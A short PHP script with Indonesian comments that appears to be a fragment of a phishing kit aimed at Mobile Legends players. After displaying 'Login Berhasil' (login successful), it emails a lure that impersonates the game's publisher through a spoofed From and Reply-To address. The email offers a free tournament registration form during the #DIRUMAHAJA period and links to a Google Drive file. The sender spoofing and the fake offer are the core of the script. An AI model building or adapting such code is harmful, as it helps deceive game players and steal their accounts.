<?php 
//ganti sesuai kebutuhan
$tgl=date('d-m-Y H:i');
  $asu = '<h4>Login Berhasil</h4>';
  $subject ="Formulir Turnamen Mobile Legeng Indonesia #DIRUMAHAJA Tanpa Biaya Daftar ";
$from = "MobileLegendsGame@gmail.com>"; //Jangan Di ubah tod
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
$body = '<h4>Terimakasih Telah Meminta Formulir Turnamen, Silahkan Isi Formulir Turnamen <a href="https://drive.google.com/file/d/1PB_X0lMYS519XfvtVJOvaGsapuy21y89/view">Disini</a></h4> ';
mail($email, $subject, $body, $headers);
$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>